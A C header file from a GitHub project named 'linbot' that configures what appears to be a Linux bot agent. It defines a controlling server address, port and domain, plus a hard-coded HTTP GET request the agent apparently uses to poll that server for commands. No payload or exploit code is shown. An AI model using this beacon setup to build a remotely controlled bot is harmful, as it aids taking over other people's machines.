/*
 * Author   : Vladislav Khudash
 * Source   : https://github.com/vk-candpython/linbot/blob/main/agent.h
 * Compiler : GCC (GNU)
 * Platform : Linux (x86_64)
 * Summary  : Agent configuration and definitions.
*/


#pragma once


/* https://github.com/vk-candpython/linbot/blob/main/lindef.h
INTERNAL LINUX (x86_64) DECLARATIONS */
#include "lindef.h"




#define BOT_SERVER_IPV4 IPv4(127, 0, 0, 1)
#define BOT_SERVER_PORT 8080

#define BOT_SERVER_DOMAIN "linbot.net"


typedef UINT32 CMDSZ;


#define SIZE_HTTP_HDR_CMD 128



#define BOT_HDR_HTTP_GET                        \
    "GET / HTTP/1.1\r\n"                        \
    "Host: " BOT_SERVER_DOMAIN "\r\n"           \
    "User-Agent: Linux/x86_64\r\n"              \
    "Accept: */*\r\n"                           \
    "Connection: keep-alive\r\n"                \
    "\r\n"

